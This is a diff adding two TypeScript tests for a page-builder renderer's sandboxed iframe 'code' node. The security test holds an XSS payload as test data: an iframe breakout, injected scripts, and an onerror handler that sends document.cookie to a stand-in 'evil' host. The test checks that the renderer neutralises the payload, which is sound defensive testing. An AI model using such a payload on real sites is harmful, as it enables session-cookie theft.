@@ -541,6 +541,72 @@ test("node kind: rich_text renders annotations and sanitizes unsafe links", () =
   assert.ok(html.includes("color:#111827"), "shared style");
 });
 
+test("node kind: code renders an opaque-origin sandboxed iframe (scripts-only)", () => {
+  const html = render([
+    {
+      id: "code-1",
+      kind: "code",
+      props: {
+        html: '<h2>Widget</h2><p>hello</p>',
+        minHeight: 200,
+        style: { borderRadius: "12px" },
+      },
+    } as BuilderNode,
+  ]);
+
+  assert.ok(html.includes('data-builder-node-kind="code"'), "kind marker");
+  // The ONLY sandbox token granted is allow-scripts — pairing it with
+  // allow-same-origin (or top-nav / popups / forms) would let framed content
+  // escape the box, so those must never appear.
+  assert.ok(html.includes('sandbox="allow-scripts"'), "scripts-only sandbox");
+  assert.ok(!html.includes("allow-same-origin"), "no allow-same-origin");
+  assert.ok(!html.includes("allow-top-navigation"), "no top-navigation");
+  assert.ok(!html.includes("allow-popups"), "no popups");
+  assert.ok(!html.includes("allow-forms"), "no forms");
+  assert.ok(!html.includes("allow-presentation"), "no presentation");
+  // Author markup is delivered via the srcdoc attribute, never inlined.
+  // (renderToStaticMarkup preserves the JSX prop casing `srcDoc`/`referrerPolicy`;
+  // the browser lowercases them — either way it is the iframe srcdoc attribute.)
+  assert.ok(html.includes("srcDoc="), "author HTML carried in srcdoc");
+  assert.ok(html.includes('referrerPolicy="no-referrer"'), "no referrer leak");
+  assert.ok(html.includes("min-height:200px"), "min-height floor applied");
+  assert.ok(html.includes("border-radius:12px"), "shared style applied");
+});
+
+test("security: code node lets NO author script run in the parent origin", () => {
+  // Worst case: author tries to break out of the srcdoc attribute, inject a
+  // parent-level <script>, and steal the parent-scoped .tulala.digital cookie.
+  const payload =
+    '<script>document.title=document.cookie</script>' +
+    '"></iframe><script>window.__PWNED__=1</script>' +
+    '<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">';
+  const html = render([
+    { id: "code-evil", kind: "code", props: { html: payload } } as BuilderNode,
+  ]);
+
+  // 1) Exactly one iframe — the breakout `</iframe><script>` did NOT terminate
+  //    our element and spill author nodes into the parent document.
+  assert.equal((html.match(/<iframe/g) ?? []).length, 1, "single iframe, no breakout");
+  // 2) No live script tag anywhere at parent level. React entity-encodes the
+  //    whole srcdoc value, so every author `<` becomes `&lt;` — there is no
+  //    parseable <script> in the parent document, only inert attribute text.
+  assert.ok(!/<script/i.test(html), "no parent-level <script>");
+  assert.ok(!html.includes('onerror="'), "no live onerror handler at parent level");
+  // 3) The author's attribute-closing quote was neutralized: the whole
+  //    `"></iframe>` breakout attempt is entity-encoded inside the srcdoc value,
+  //    so it could not terminate the attribute or our element early.
+  assert.ok(
+    html.includes("&quot;&gt;&lt;/iframe&gt;"),
+    "breakout attempt entity-encoded inside srcdoc",
+  );
+  assert.ok(html.includes("&quot;"), "author quotes entity-encoded");
+  // 4) The payload survives — but only inside the srcdoc attribute, entity-
+  //    encoded — proving it is data, parsed by the sandboxed frame, not the host.
+  assert.ok(html.includes("&lt;script&gt;"), "author script preserved as inert text");
+  assert.ok(html.includes('sandbox="allow-scripts"'), "still scripts-only sandbox");
+  assert.ok(!html.includes("allow-same-origin"), "still no same-origin");
+});
+
 test("a11y: non-decorative icon without a label falls back to an accessible name", () => {
   const html = render([
     {
